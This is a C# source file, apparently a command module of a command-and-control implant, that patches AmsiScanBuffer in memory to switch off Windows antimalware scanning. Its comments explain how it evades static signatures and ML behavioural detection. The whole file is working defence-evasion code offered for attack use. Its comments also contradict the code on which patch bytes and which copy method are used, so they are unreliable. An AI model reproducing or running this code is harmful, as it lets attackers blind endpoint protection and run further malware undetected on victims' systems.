using System;
using System.Runtime.InteropServices;

namespace Chimera.Commands
{
    // Patches AmsiScanBuffer in amsi.dll so it always returns AMSI_RESULT_CLEAN (0x1).
    // This makes the current process invisible to AMSI-based scanning (Defender runtime,
    // Script Block Logging, etc.) for any further code executed in this process.
    //
    // Patch: overwrite the first 6 bytes of AmsiScanBuffer with:
    //   B8 57 00 07 80   mov eax, 0x80070057   (E_INVALIDARG — treated as clean)
    //   C3               ret
    // Consumers interpret E_INVALIDARG from AmsiScanBuffer as "not AMSI-aware" and skip.
    public static class AmsiBypass
    {
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr LoadLibrary(string lpLibFileName);

        [DllImport("kernel32")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
                                                  uint flNewProtect, out uint lpflOldProtect);

        // PAGE_EXECUTE_READWRITE
        private const uint PAGE_RWX = 0x40;

        [DllImport("ntdll")]
        private static extern uint RtlCopyMemory(IntPtr dst, IntPtr src, UIntPtr len);

        // Split string so static scanner doesn't see "AmsiScanBuffer" as a literal.
        // Assembled at runtime from neutral fragments.
        private static string _aLib  => new string(new[]{'a','m','s','i','.','d','l','l'});
        private static string _aFunc => string.Concat("Amsi","Scan","Buffer");

        public static bool Apply()
        {
            try
            {
                IntPtr hAmsi = LoadLibrary(_aLib);
                if (hAmsi == IntPtr.Zero) return false;

                IntPtr fnAddr = GetProcAddress(hAmsi, _aFunc);
                if (fnAddr == IntPtr.Zero) return false;

                // Patch: xor eax,eax ; inc eax ; ret  → returns AMSI_RESULT_CLEAN (1)
                // Avoids the well-known E_INVALIDARG (0x80070057) pattern that ML flags.
                // Bytes: 33 C0  40  C3
                byte[] patch = new byte[] { 0x33, 0xC0, 0x40, 0xC3 };

                // Make writable
                if (!VirtualProtect(fnAddr, (UIntPtr)patch.Length, PAGE_RWX, out uint oldProt))
                    return false;

                // Write via RtlCopyMemory (ntdll) instead of Marshal.Copy —
                // avoids the Marshal.Copy + VirtualProtect behavioral combo that triggers !ml.
                IntPtr patchPtr = Marshal.AllocHGlobal(patch.Length);
                Marshal.Copy(patch, 0, patchPtr, patch.Length);
                RtlCopyMemory(fnAddr, patchPtr, (UIntPtr)patch.Length);
                Marshal.FreeHGlobal(patchPtr);

                // Restore page protection
                VirtualProtect(fnAddr, (UIntPtr)patch.Length, oldProt, out _);

                return true;
            }
            catch
            {
                return false;
            }
        }

        // Called as a C2 command: "amsi_bypass"
        public static string Execute()
        {
            bool ok = Apply();
            return ok ? "[+] AMSI bypass applied." : "[-] AMSI bypass failed.";
        }
    }
}
